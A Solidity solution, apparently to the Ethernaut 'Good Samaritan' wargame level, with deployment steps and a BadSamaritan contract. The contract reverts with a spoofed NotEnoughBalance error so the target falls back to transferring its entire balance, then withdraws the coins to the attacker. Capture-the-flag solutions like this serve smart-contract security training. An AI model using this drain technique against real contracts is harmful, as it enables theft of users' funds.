/*Tools needed for this level:
- Console
- Remix

1.- Copy the GoodSamaritan conglomerate to Remix IDE. No need to deploy

2.- Deploy this contract (BadSamaritan) with Remix using the injected Web3 environment
passing the GoodSamaritan address to its constructor.

3.- Call the attack() function.

4.- Call the withdraw() function.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { GoodSamaritan, Coin } from "./GoodSamaritan.sol";

contract BadSamaritan {
	address private immutable attacker;
	GoodSamaritan private immutable goodSamaritan;
	Coin private coin;

	error NotEnoughBalance();

	constructor(address _gs) {
		attacker = msg.sender;
		goodSamaritan = GoodSamaritan(_gs);
	}

	function notify(uint256 amount) external {
		coin = Coin(goodSamaritan.coin());
		if (coin.balances(address(goodSamaritan.wallet())) > amount) revert NotEnoughBalance();
	}

	function attack() external {
		goodSamaritan.requestDonation();
	}

	function withdraw() external {
		coin.transfer(attacker, coin.balances(address(this)));
	}
}
